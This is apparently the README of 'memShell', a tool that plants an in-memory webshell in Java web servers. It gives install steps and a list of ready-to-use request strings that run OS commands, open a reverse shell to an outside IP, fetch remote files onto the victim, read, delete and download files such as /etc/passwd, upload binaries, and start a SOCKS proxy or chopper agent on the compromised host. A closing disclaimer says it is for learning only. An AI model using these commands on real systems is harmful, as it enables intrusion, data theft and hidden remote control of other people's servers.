# memShell
a webshell resides in the memory of java web server

# install
* unzip memShell.zip
* cd memShell
* java -jar inject.jar
# usage
* anyurl?pass_the_world=pass //show this help page.  
* anyurl?pass_the_world=pass&model=exec&cmd=whoami  //run os command.  
* anyurl?pass_the_world=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.  
* anyurl?pass_the_world=pass&model=urldownload&url=http://xxx.com/test.pdf&path=/tmp/test.pdf //download a remote file via the victim's network directly.  
* anyurl?pass_the_world=pass&model=list[del|show]&path=/etc/passwd  //list,delete,show the specified path or file.  
* anyurl?pass_the_world=pass&model=download&path=/etc/passwd  //download the specified file on the victim's disk.  
* anyurl?pass_the_world=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b]   //upload a text file or a base64 encoded binary file to the victim's disk.  
* anyurl?pass_the_world=pass&model=proxy  //start a socks proxy server on the victim.  
* anyurl?pass_the_world=pass&model=chopper  //start a chopper server agent on the victim.  

**!!!It is recommended to use the POST method to submit data.** 

# note
For learning exchanges only, do not use for illegal purposes.by rebeyond.
